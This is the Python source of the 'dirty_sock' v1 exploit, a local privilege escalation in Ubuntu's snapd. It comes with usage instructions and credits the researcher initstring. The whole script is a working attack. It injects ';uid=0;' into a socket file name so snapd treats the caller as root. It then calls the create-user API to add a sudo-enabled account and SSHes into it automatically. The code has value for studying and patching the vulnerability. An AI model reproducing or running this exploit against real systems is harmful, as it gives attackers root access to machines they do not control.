#!/usr/bin/env python3

"""
Local privilege escalation via snapd, affecting Ubuntu and others.

v1 of dirty_sock leverages the /v2/create-user API to create a new local user
based on information in an Ubuntu SSO profile. It requires outbound Internet
access as well as the SSH service running and available from localhost.

Try v2 in more restricted environments, but use v1 when possible.

Before running v1, you need to:
    - Create an Ubuntu SSO account (https://login.ubuntu.com/)
    - Login to that account and ensure you have your public SSH key configured
      in your profile.

Run exploit like this:
    dirty_sock.py -u <account email> -k <ssh priv key file>

A new local user with sudo rights will be created using the username from your
Ubuntu SSO profile. The SSH public key will be copied into this users profile.

The exploit will automatically SSH into localhost when finished.

Research and POC by initstring (https://github.com/initstring/dirty_sock)
"""

import argparse
import string
import random
import socket
import re
import sys
import os

BANNER = r'''
      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 1)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//

'''


def process_args():
    """Handles user-passed parameters"""
    parser = argparse.ArgumentParser()
    parser.add_argument('--username', '-u', type=str, action='store',
                        required=True, help='Your Ubuntu One account email.')
    parser.add_argument('--key', '-k', type=str, action='store',
                        required=True, help='Full path to the ssh privkey'
                        ' matching the pubkey in your Ubuntu One account.')

    args = parser.parse_args()

    if not os.path.isfile(args.key):
        print("[!] That key file does not exist. Please try again.")
        sys.exit()

    return args

def create_sockfile():
    """Generates a random socket file name to use"""
    alphabet = string.ascii_lowercase
    random_string = ''.join(random.choice(alphabet) for i in range(10))
    dirty_sock = ';uid=0;'

    # This is where we slip on the dirty sock. This makes its way into the
    # UNIX AF_SOCKET's peer data, which is parsed in an insecure fashion
    # by snapd's ucrednet.go file, allowing us to overwrite the UID variable.
    sockfile = '/tmp/' + random_string + dirty_sock

    print("[+] Slipped dirty sock on random socket file: " + sockfile)

    return sockfile

def bind_sock(sockfile):
    """Binds to a local file"""
    # This exploit only works if we also BIND to the socket after creating
    # it, as we need to inject the dirty sock as a remote peer in the
    # socket's ancillary data.
    print("[+] Binding to socket file...")
    client_sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    client_sock.bind(sockfile)

    # Connect to the snap daemon
    print("[+] Connecting to snapd API...")
    client_sock.connect('/run/snapd.socket')

    return client_sock

def add_user(args, client_sock):
    """Main exploit function"""
    post_payload = ('{"email": "' + args.username +
                    '", "sudoer": true, "force-managed": true}')
    http_req = ('POST /v2/create-user HTTP/1.1\r\n'
                'Host: localhost\r\n'
                'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n'
                + post_payload)

    # Send our payload to the snap API
    print("[+] Sending payload...")
    client_sock.sendall(http_req.encode("utf-8"))

    # Receive the data and extract the JSON
    http_reply = client_sock.recv(8192).decode("utf-8")

    # Try to extract a username from the valid reply
    regex = re.compile(r'"status":"OK","result":{"username":"(.*?)"')
    username = re.findall(regex, http_reply)

    # If exploit was not successful, give details and exit
    if '"status":"Unauthorized"' in http_reply:
        print("[!] System may not be vulnerable, here is the API reply:\n\n")
        print(http_reply)
        sys.exit()

    if 'cannot find user' in http_reply:
        print("[!] Could not find user in the snap store... did you follow"
              " the instructions?")
        print("Here is the API reply:")
        print(http_reply)
        sys.exit()

    if not username:
        print("[!] Something went wrong... Here is the API reply:")
        print(http_reply)
        sys.exit()

    # SSH into localhost with our new root account
    print("[+] Success! Enjoy your new account with sudo rights!")
    cmd1 = 'chmod 600 ' + args.key
    cmd2 = 'ssh ' + username[0] + '@localhost -i ' + args.key
    os.system(cmd1)
    os.system(cmd2)

    print("[+] Hope you enjoyed your stay!")
    sys.exit()



def main():
    """Main program function"""

    # Gotta have a banner...
    print(BANNER)

    # Process the required arguments
    args = process_args()

    # Create a random name for the dirty socket file
    sockfile = create_sockfile()

    # Bind the dirty socket to the snapdapi
    client_sock = bind_sock(sockfile)

    # Exploit away...
    add_user(args, client_sock)

    # Remove the dirty socket file
    os.remove(sockfile)


if __name__ == '__main__':
    main()

